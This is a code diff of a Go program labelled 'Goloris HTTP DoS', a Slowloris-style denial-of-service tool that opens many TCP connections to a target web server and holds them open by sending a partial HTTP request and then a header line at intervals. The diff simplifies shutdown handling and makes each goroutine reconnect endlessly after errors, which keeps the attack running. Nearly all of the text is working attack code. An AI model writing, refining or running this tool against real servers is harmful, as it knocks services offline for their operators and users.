@@ -12,20 +12,10 @@ import (
 	"flag"
 )
 
-type connectionError struct {
-	err error
-	killIndex int // index of the the kill channel in kill channel list
-}
-
-func (c *connectionError) Error() string {
-	return c.err.Error()
-}
-
 const (
 	defaultUserAgent = "Goloris HTTP DoS"
 )
 
-// Command line options
 var (
 	numConnections int
 	interval int
@@ -49,8 +39,7 @@ func main() {
 		target += ":80"
 	}
 
-	donechan := make(chan int)
-	killchans := openConnections(target, numConnections, donechan)
+	openConnections(target, numConnections)
 
 	signal.Notify(signals, os.Interrupt, os.Kill)
 
@@ -58,18 +47,8 @@ loop:
 	for {
 		select {
 		case <-signals:
-			fmt.Printf("Received SIGKILL, killing connections...")
-			for _, killchan := range killchans {
-				killchan <- true
-			}
-			fmt.Printf("done\n")
+			fmt.Printf("Received SIGKILL, exiting...\n")
 			break loop
-
-		case index := <-donechan:
-			fmt.Println("an error occured withing a connection, starting a new one")
-			kill := make(chan bool)
-			killchans[index] = kill
-			go slowloris(target, interval, kill, index, donechan)
 		}
 	}
 }
@@ -93,56 +72,41 @@ func usage() {
 	fmt.Println("")
 }
 
-// Open given number of connections to target and return a chan slice that
-// is used to kill the goroutines
-func openConnections(target string, num int, donechan chan int) []chan bool {
-	killchans := make([]chan bool, 0)
-
+func openConnections(target string, num int) {
 	for i:=0; i<num; i++ {
-		kill := make(chan bool)
-		go slowloris(target, interval, kill, i, donechan)
-		killchans = append(killchans, kill)
+		go slowloris(target, interval)
 	}
-
-	return killchans
 }
 
-func slowloris(target string, interval int, kill chan bool, killIndex int, donechan chan int) {
-	conn, err := net.Dial("tcp", target)
-	if err != nil {
-		donechan <- killIndex
-		return
-	} 
-	defer conn.Close()
+func slowloris(target string, interval int) {
 
-	// Send first headers
-	host := target 
-	headers := makeHeaders(host)
-	req := createRequest(host, method, resource, headers)
-	_, err = io.Copy(conn, req)
-	if err != nil {
-		donechan <- killIndex
-		return
-	}
-
-	// Send a header every interval seconds, until an error occurs or 
-	// a signal is sent through the kill channel
-	loop:
+loop:
 	for {
-		select {
-		case <-kill:
-			break loop
+		conn, err := net.Dial("tcp", target)
+		if err != nil {
+			continue
+		} 
+		defer conn.Close()
 
-		case <-time.After(time.Duration(interval) * time.Second):
-			_, err := conn.Write([]byte("Cookie: a=b\r\n"))
-			if err != nil {
-				donechan <- killIndex
-				return
+		host := target 
+		headers := makeHeaders(host)
+		req := createRequest(host, method, resource, headers)
+		_, err = io.Copy(conn, req)
+		if err != nil {
+			continue
+		}
+
+		for {
+			select {
+			case <-time.After(time.Duration(interval) * time.Second):
+				_, err := conn.Write([]byte("Cookie: a=b\r\n"))
+				if err != nil {
+					continue loop
+				}
 			}
 		}
 	}
 
-	return
 }
 
 func createRequest(host, method, resource string, headers map[string]string) *bytes.Buffer {
